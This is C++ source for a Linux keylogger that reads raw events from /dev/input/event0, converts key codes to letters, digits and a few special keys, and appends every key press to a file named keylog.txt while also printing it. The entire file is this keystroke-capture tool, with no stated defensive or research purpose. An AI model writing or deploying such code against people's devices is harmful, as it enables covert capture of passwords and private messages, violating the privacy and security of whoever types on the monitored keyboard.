#include <iostream>
#include <fstream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

const char* LOG_FILE = "keylog.txt";

/**
 * Logs a key press to a file.
 */
void logKey(const std::string& key) {
    std::ofstream logfile(LOG_FILE, std::ios::app);
    if (logfile.is_open()) {
        logfile << key << " ";
        logfile.close();
    }
}

/**
 * Maps key codes to readable key names.
 */
std::string keyCodeToString(int keyCode) {
    switch (keyCode) {
        case KEY_A: return "A";
        case KEY_B: return "B";
        case KEY_C: return "C";
        case KEY_D: return "D";
        case KEY_E: return "E";
        case KEY_F: return "F";
        case KEY_G: return "G";
        case KEY_H: return "H";
        case KEY_I: return "I";
        case KEY_J: return "J";
        case KEY_K: return "K";
        case KEY_L: return "L";
        case KEY_M: return "M";
        case KEY_N: return "N";
        case KEY_O: return "O";
        case KEY_P: return "P";
        case KEY_Q: return "Q";
        case KEY_R: return "R";
        case KEY_S: return "S";
        case KEY_T: return "T";
        case KEY_U: return "U";
        case KEY_V: return "V";
        case KEY_W: return "W";
        case KEY_X: return "X";
        case KEY_Y: return "Y";
        case KEY_Z: return "Z";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_SPACE: return "SPACE";
        case KEY_ENTER: return "ENTER";
        case KEY_BACKSPACE: return "BACKSPACE";
        default: return "UNKNOWN";
    }
}

int main() {
    const char* device = "/dev/input/event0"; // Change to your keyboard device
    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        std::cerr << "Failed to open input device: " << device << "\n";
        return 1;
    }

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY && ev.value == 1) { // Key press event
            std::string key = keyCodeToString(ev.code);
            logKey(key);
            std::cout << "Key Pressed: " << key << "\n";
        }
    }

    close(fd);
    return 0;
}

